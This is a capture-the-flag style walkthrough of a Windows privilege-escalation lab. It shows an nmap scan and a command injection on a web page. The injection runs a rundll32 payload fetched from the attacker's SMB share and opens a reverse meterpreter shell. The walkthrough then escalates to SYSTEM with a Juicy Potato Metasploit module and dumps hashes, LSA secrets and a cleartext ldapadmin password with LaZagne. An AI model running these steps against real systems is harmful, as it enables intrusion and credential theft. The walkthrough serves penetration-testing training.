
During a penetration test against the INLANEFREIGHT organization, you encounter a non-domain joined Windows server host that suffers from an unpatched command injection vulnerability. After gaining a foothold, you come across credentials that may be useful for lateral movement later in the assessment and uncover another flaw that can be leveraged to escalate privileges on the target host.

For this assessment, assume that your client has a relatively mature patch/vulnerability management program but is understaffed and unaware of many of the best practices around configuration management, which could leave a host open to privilege escalation.

Enumerate the host (starting with an Nmap port scan to identify accessible ports/services), leverage the command injection flaw to gain reverse shell access, escalate privileges to `NT AUTHORITY\SYSTEM` level or similar access, and answer the questions below to complete this portion of the assessment.

port discovery.

```
└─$ sudo nmap -A -Pn 10.129.60.222 -oA skill1     
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-14 10:53 +0530
Nmap scan report for 10.129.60.222
Host is up (0.30s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: DEV Connection Tester
|_http-server-header: Microsoft-IIS/10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WINLPE-SKILLS1-SRV
| Not valid before: 2026-07-13T05:17:26
|_Not valid after:  2027-01-12T05:17:26
|_ssl-date: 2026-07-14T05:24:47+00:00; +29s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WINLPE-SKILLS1-
|   NetBIOS_Domain_Name: WINLPE-SKILLS1-
|   NetBIOS_Computer_Name: WINLPE-SKILLS1-
|   DNS_Domain_Name: WINLPE-SKILLS1-SRV
|   DNS_Computer_Name: WINLPE-SKILLS1-SRV
|   Product_Version: 10.0.14393
|_  System_Time: 2026-07-14T05:24:42+00:00
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|2012 (87%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows Server 2016 (87%), Microsoft Windows Server 2012 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 28s, deviation: 0s, median: 28s

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   298.59 ms 10.10.14.1
2   298.62 ms 10.129.60.222

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.24 seconds

```

we found that the website running on port 80 has a command injection vulnerability.

```
127.0.0.1 |whoami


iis apppool\defaultapppool
```

so we will be creating a smb_delivery payload using msf which we created in the module previously.


setup an smb_delivery in the msf.

```
f exploit(windows/smb/smb_delivery) > show options

Module options (exploit/windows/smb/smb_delivery):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   FILE_NAME    test.dll         no        DLL file name
   FOLDER_NAME                   no        Folder name to share (Default: none)
   JOHNPWFILE                    no        Name of file to store JohnTheRipper hashes in. Supp
                                           orts NTLMv1 and NTLMv2 hashes, each of which is sto
                                           red in separate files. Can also be a path.
   SHARE                         no        Share (Default: random); cannot contain spaces or s
                                           lashes
   SRVHOST      10.10.15.187     no        The local host to listen on and use for incoming co
                                           nnections.
   SRVPORT      445              yes       The local port to listen on.
   SRVSSL       false            no        Negotiate SSL/TLS for local server connections


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, no
                                        ne)
   LHOST     10.10.15.187     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   DLL



View the full module info with the info, or info -d command.

msf exploit(windows/smb/smb_delivery) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.15.187:4444 




```


paste this in the website address space.
```
127.0.0.1 |rundll32.exe \\10.10.15.187\PdaVAF\test.dll,0
```


now you will have a session in the meterpreter, change it to shell for better control.

```
f exploit(windows/smb/smb_delivery) > [*] Server is running. Listening on 10.10.15.187:445
[*] Server started.
[*] Run the following command on the target machine:
rundll32.exe \\10.10.15.187\PdaVAF\test.dll,0
[*] Sending stage (199238 bytes) to 10.129.60.222
[*] Meterpreter session 1 opened (10.10.15.187:4444 -> 10.129.60.222:49671) at 2026-07-14 11:16:39 +0530
sessions

Active sessions
===============

  Id  Name  Type                     Information                  Connection
  --  ----  ----                     -----------                  ----------
  1         meterpreter x86/windows  IIS APPPOOL\DefaultAppPool   10.10.15.187:4444 -> 10.129.
                                     @ WINLPE-SKILLS1-            60.222:49671 (10.129.60.222)



msf exploit(windows/smb/smb_delivery) > sessions -i 1
[*] Starting interaction with 1...




```



```
meterpreter > shell
Process 1876 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool


```

**Q1. Which two KBs are installed on the target system? (Answer format: 3210000&3210060)**

```
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 WINLPE-SKILLS1-
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00376-30821-30176-AA757
Original Install Date:     5/25/2021, 8:57:43 PM
System Boot Time:          7/13/2026, 10:17:15 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.24504846.B64.2501180334, 1/18/2025
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 3,363 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 4,096 MB
Virtual Memory: In Use:    703 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 2 Hotfix(s) Installed.
                           [01]: KB3199986
                           [02]: KB3200970
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.10.2
                                 IP address(es)
                                 [01]: 10.129.60.222
                                 [02]: fe80::4133:34d5:5a41:169d
                                 [03]: dead:beef::4133:34d5:5a41:169d
                                 [04]: dead:beef::dd
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

c:\windows\system32\inetsrv>

```

**Q2.Find the password for the ldapadmin account somewhere on the system.

using the file transfer techniques learned from previous modules transfer lazagne.exe to the target host.

```
└─$ python3 -m http.server 8080                                                 
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...

****

Invoke-WebRequest -Uri "http://10.10.15.187:8080/LaZagne.exe" -OutFile "C:\Windows\Temp\lz.exe"

```

for running this we have to have system privilege will will try to escalate using msf itself.

tip even though the OS is x64 the process is x86 and also the meterpreter session generated through notepad.exe will also be x86 so you should run only the x86 version of payload and no need to migrate the process.

``` 
804   2328  notepad.exe     x86   0        NT AUTHORITY\SYSTEM       C:\Windows\SysWOW64\note
                                                                      pad.exe

```

```
payload => windows/meterpreter/reverse_tcp
msf exploit(windows/local/ms16_075_reflection_juicy) > options

Module options (exploit/windows/local/ms16_075_reflection_juicy):

   Name     Current Setting                   Required  Description
   ----     ---------------                   --------  -----------
   CLSID    {F7FD3FD6-9994-452D-8DA7-9A8FD87  yes       Set CLSID value of the DCOM to trigger
            AEEF4}
   SESSION  2                                 yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  none             yes       Exit technique (Accepted: '', seh, thread, process, no
                                        ne)
   LHOST     10.10.15.187     yes       The listen address (an interface may be specified)
   LPORT     4445             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf exploit(windows/local/ms16_075_reflection_juicy) > set lport 4443
lport => 4443
msf exploit(windows/local/ms16_075_reflection_juicy) > run
[*] Started reverse TCP handler on 10.10.15.187:4443 
[+] Target appears to be vulnerable (Windows Server 2016)
[*] Launching notepad to host the exploit...
[+] Process 4088 launched.
[*] Reflectively injecting the exploit DLL into 4088...
[*] Injecting exploit into 4088...
[*] Exploit injected. Injecting exploit configuration into 4088...
[*] Configuration injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (199238 bytes) to 10.129.225.46
[*] Meterpreter session 3 opened (10.10.15.187:4443 -> 10.129.225.46:49724) at 2026-07-14 13:34:04 +0530

```

```
C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

```

now we can run the lazagne.exe that we uploaded using python server technique

```
    Directory: C:\Windows\Temp


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-----         6/7/2021  11:37 AM                D1551C5A-F073-4BBB-B9CE-B73CF7
                                                 2D8486-Sigs                   
d-----        5/26/2021   6:24 PM                vmware-SYSTEM                 
-a----         6/4/2021   6:46 PM           1020 ASPNETSetup_00000.log         
-a----         6/4/2021   6:46 PM           1022 ASPNETSetup_00001.log         
-a----        5/25/2021   8:57 PM              0 DMIC2CF.tmp                   
-a----        5/25/2021   8:57 PM              0 DMIC38C.tmp                   
-a----        7/14/2026  12:11 AM         347648 J.exe                         
-a----        7/13/2026  11:40 PM       10136093 lz.exe                        
-a----         8/8/2021   6:15 PM          53234 MpCmdRun.log                  
-a----         6/7/2021  11:37 AM          65010 MpSigStub.log                 
-a----        7/13/2026  11:16 PM            102 silconfig.log                 
-a----         8/9/2021   6:08 PM         748512 vmware-vmsvc-SYSTEM.log       
-a----         8/9/2021   6:08 PM           1188 vmware-vmtoolsd-Administrator.
                                                 log                           
-a----         8/8/2021   6:34 PM            198 vmware-vmtoolsd-htb-student.lo
                                                 g                             
-a----        7/13/2026  11:15 PM           1188 vmware-vmtoolsd-SYSTEM.log    
-a----         8/9/2021   6:08 PM          15936 vmware-vmusr-Administrator.log
-a----         8/8/2021   6:39 PM           2652 vmware-vmusr-htb-student.log  
-a----        7/13/2026  11:15 PM           1056 vmware-vmvss-SYSTEM.log       


PS C:\Windows\Temp> .\lz.exe all
.\lz.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

[+] System masterkey decrypted for 1ef7b31a-39fd-4309-877e-c354d5a19506
[+] System masterkey decrypted for 644d306e-3a7a-434b-bd62-0b81ab91e5b6
[+] System masterkey decrypted for 6977da93-ec45-468e-8a19-97d9865fb2e6

########## User: SYSTEM ##########

------------------- Hashdump passwords -----------------

Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
mrb3n:1000:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
htb-student:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::

------------------- Lsa_secrets passwords -----------------

DPAPI_SYSTEM
0000   01 00 00 00 1D 35 B6 2C 53 EC 28 92 E8 6D D5 BE    .....5.,S.(..m..
0010   C7 4C 78 54 10 66 34 3A 70 3F 77 AF 3F 11 FA 7F    .LxT.f4:p?w.?...
0020   03 8D 79 6A CC 1A FF AC 7C 0E DD D3                ..yj....|...

NL$KM
0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
0010   99 4F 5D 6C 55 B9 EC B5 0C 0B D8 75 A2 88 93 E4    .O]lU......u....
0020   C0 D9 EF C5 0D B9 40 57 92 39 9A BE 9D A5 83 ED    ......@W.9......
0030   11 CB 71 7C AB 32 CD 11 FD 7A ED 2E AB BE F1 62    ..q|.2...z.....b
0040   58 F2 1D 8A AC 9F AC FB 32 17 D8 EE B3 BD A5 DC    X.......2.......
0050   E2 D9 82 77 4A A3 16 D6 F3 B5 E0 28 13 72 C7 2E    ...wJ......(.r..



########## User: Administrator ##########

------------------- Apachedirectorystudio passwords -----------------

[+] Password found !!!
Host: dc01.inlanefreight.local
Port: 389
Login: ldapadmin
Password: car3ful_st0rinG_cr3d$
AuthenticationMethod: SIMPLE


########## User: htb-student ##########

------------------- Apachedirectorystudio passwords -----------------

[+] Password found !!!
Host: DC01.INLANEFREIGHT.LOCAL
Port: 389
Login: ldapadmin
Password: car3ful_st0rinG_cr3d$
AuthenticationMethod: SIMPLE


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 20.937537908554077
PS C:\Windows\Temp> 

```


**Q3.Escalate privileges and submit the contents of the flag.txt file on the Administrator Desktop.


```
 Directory of C:\Users\Administrator\Desktop

08/08/2021  06:54 PM    <DIR>          .
08/08/2021  06:54 PM    <DIR>          ..
08/09/2021  06:08 PM                26 flag.txt
               1 File(s)             26 bytes
               2 Dir(s)  18,923,384,832 bytes free

C:\Users\Administrator\Desktop>type flag.txt

```

**Q4.After escalating privileges, locate a file named confidential.txt. Submit the contents of this file.

```
C:\Users\Administrator\Desktop>type "C:\Documents and Settings\Administrator\Documents\My Music\confidential.txt"
 
type "C:\Documents and Settings\Administrator\Documents\My Music\confidential.txt"

```


### 📋 Recommended CLSIDs for Windows Server 2016

| **Service Name**                 | **CLSID Value**                          | **Run As Account**  |
| -------------------------------- | ---------------------------------------- | ------------------- |
| **WMI Service**                  | `{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}` | NT AUTHORITY\SYSTEM |
| **BITS Service (Most Reliable)** | `{e60687f7-01a1-40aa-86ac-db1cbf673334}` | NT AUTHORITY\SYSTEM |
| **Network Connections**          | `{BA126AD5-2166-11D1-B1D0-00805FC1270E}` | NT AUTHORITY\SYSTEM |
